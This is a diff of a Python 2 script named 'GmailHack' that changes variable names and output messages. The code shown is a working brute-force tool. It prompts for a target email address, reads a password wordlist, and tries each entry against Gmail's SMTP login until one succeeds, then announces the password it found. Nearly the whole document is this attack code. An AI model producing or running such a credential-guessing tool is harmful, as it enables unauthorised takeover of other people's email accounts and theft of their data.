@@ -11,43 +11,43 @@ def main():
    print '               ++++++++++++++++++++                '
    print '\n                                                 '
    print '                   GmailHack                       '
-   print '                                 ()   V.1.2        '
+   print '                                 V.1.2             '
    print '                                                   '
    
 main()
 print '[01] Start Attack'
 print '[02] Exit'
-option = input('==>')
+option = input('===>')
 if option == 1:
    file_path = raw_input('Path of Password File :')
 else:
    system('clear')
    exit()
 pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
+pass_lst = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('target email :')
+    usr = raw_input('Target Email :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
-    for password in pass_list:
+    for passw in pass_lst:
       i = i + 1
-      print str(i) + '/' + str(len(pass_list))
+      print str(i) + '/' + str(len(pass_lst))
       try:
-         server.login(user_name, password)
+         server.login(usr, passw)
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print '[+] Password Found => ' + passw
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+            print '[+] Password Found => ' + passw
 
             break
          else:
-            print '[!] password not found => ' + password
+            print '[!] Password not Found => ' + passw
 login()
